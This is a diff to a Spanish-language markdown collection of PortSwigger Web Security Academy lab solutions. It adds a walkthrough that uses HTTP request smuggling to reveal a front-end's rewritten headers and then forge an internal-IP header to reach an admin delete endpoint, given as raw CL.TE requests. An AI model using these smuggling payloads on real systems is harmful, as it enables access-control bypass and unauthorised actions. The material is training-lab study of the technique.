@@ -483,7 +483,7 @@ Para resolver el laboratorio se carga en el exploit server un `iframe`, donde el
 
 ### [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
 
-Al ingresar en un posteo del sitio vulnerable, al final de todo hay un link que debería redirigir a la home. En caso de que `returnUrl` tenga un valor *truthy*, se le asignará a `location.href` el valor en la posición 1. Si no, se le asignará `"/"`.
+Al ingresar en un posteo del sitio vulnerable, al final de todo hay un link que debería redirigir a la home. En caso de que `returnUrl` tenga un valor _truthy_, se le asignará a `location.href` el valor en la posición 1. Si no, se le asignará `"/"`.
 
 ```
 <a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"">Back to Blog</a>
@@ -684,7 +684,7 @@ Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp 
 
 ```
 POST / HTTP/1.1
-Host: ac591f991f4825f6802dab1700150048.web-security-academy.net
+Host: LABID.web-security-academy.net
 Content-Length: 91
 Transfer-Encoding: chunked
 
@@ -705,7 +705,7 @@ Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp 
 
 ```
 POST / HTTP/1.1
-Host: acf41fd21fb3668e801a6d9900c800f7.web-security-academy.net
+Host: LABID.web-security-academy.net
 Content-Length: 4
 Transfer-Encoding: chunked
 
@@ -718,6 +718,54 @@ Transfer-Encoding: chunked
 0
 
 
+```
+
+### [Exploiting HTTP request smuggling to reveal front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)
+
+#### Solución:
+
+Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener el salto de línea del final):
+
+```
+POST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 52
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Length: 150
+
+search=asd
+
+```
+
+En la segunda response, arriba del input de búsqueda debería aparecer algo como:
+
+```
+0 search results for 'POST / HTTP/1.1
+X-vDTCOL-Ip: 181.117.13.38
+Host: ac0d1fb51fe4661f80e980ba003200cb.web-security-academy.net
+Content-Length: 52
+Transfer-Enco'
+```
+
+Enviar 2 veces la siguiente request, reemplazando el header X-\*\*\*\*\*\*-Ip con el obtenido en la request anterior:
+
+```
+POST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 98
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-******-Ip: 127.0.0.1
+Content-Length: 30
+
+foo
 ```
 
 ---
